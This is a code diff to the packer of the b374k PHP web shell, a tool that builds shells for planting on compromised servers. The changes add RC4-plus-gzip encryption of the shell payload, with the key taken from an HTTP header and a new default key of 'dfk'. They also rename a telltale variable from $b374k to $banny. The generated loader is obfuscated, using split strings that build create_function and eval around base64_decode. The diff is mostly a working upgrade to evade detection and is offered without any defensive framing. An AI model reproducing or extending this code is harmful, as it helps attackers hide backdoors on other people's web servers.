@@ -11,7 +11,7 @@
 
 */
 $GLOBALS['packer']['title'] = "b374k shell packer";
-$GLOBALS['packer']['version'] = "0.4.2";
+$GLOBALS['packer']['version'] = "0.4.3";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
@@ -188,6 +188,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 					<option selected="selected">gzdeflate</option>
 					<option>gzencode</option>
 					<option>gzcompress</option>
+                    <option>rc4</option>
 				</select>
 				<select id='compress_level' style='width:150px;'>
 					<option>1</option>
@@ -288,7 +289,7 @@ else{
 		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
 		$output .= "\t-l\t\t\t\t\tlist available modules\n";
 		$output .= "\t-k\t\t\t\t\tlist available themes\n";
-		$output .= "\t-u code\t\t\t\t\tsystem language encode, such as utf-8/gb2312..\n";
+		$output .= "\t-u code\t\t\t\t\tsystem language encode, such as utf-8/gb2312/gbk..\n";
 
 	}
 	else{
@@ -569,7 +570,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$encoder_func = "gz'.'un'.'com'.'pre'.'ss";
 	}
 	elseif($compress=="rc4"){
-		$content = rc4($GLOBALS['cipher_key'], $content);
+		$content = rc4($GLOBALS['cipher_key'], gzcompress($content, $compress_level));
 		$encoder_func = "r"."c4";
 	}
 	else{
@@ -580,7 +581,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		$content = base64_encode($content);
 		if($compress!='no'){
 			if($compress=="rc4") {
-				$encoder = $encoder_func."(isset(\$_SERVER[\\'HTTP_RC4_KEY\\'])?\$_SERVER[\\'HTTP_RC4_KEY\\']:\\'b374k\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
+				$encoder = "gz'.'un'.'com'.'pre'.'ss(".$encoder_func."(isset(\$_SERVER[\\'HTTP_RC4_KEY\\'])?\$_SERVER[\\'HTTP_RC4_KEY\\']:\\'dfk\\',ba'.'se'.'64'.'_de'.'co'.'de(\$x)))";
 			} else {
 				$encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))";
 			}
@@ -589,7 +590,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 			$encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")";
 		}
 
-		$code = $header.$password."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$b374k=\$func('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$b374k(\"".$content."\");{$rc4_function}?>";
+		$code = $header.$password."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$banny=\$func('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$banny(\"".$content."\");{$rc4_function}?>";
 	}
 	else{
 		if($compress!='no'){
@@ -606,7 +607,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		chmod($output, 0777);
 		return "Succeeded : <a href='".$output."' target='_blank'>[ ".$output." ] Filesize : ".filesize($output)."</a>{[|b374k|]}".packer_html_safe(trim($code));
 	}
-	return "error{[|b374k|]}";
+	return "error{[|banny|]}";
 }
 
 function generateRandomString($length = 10) {
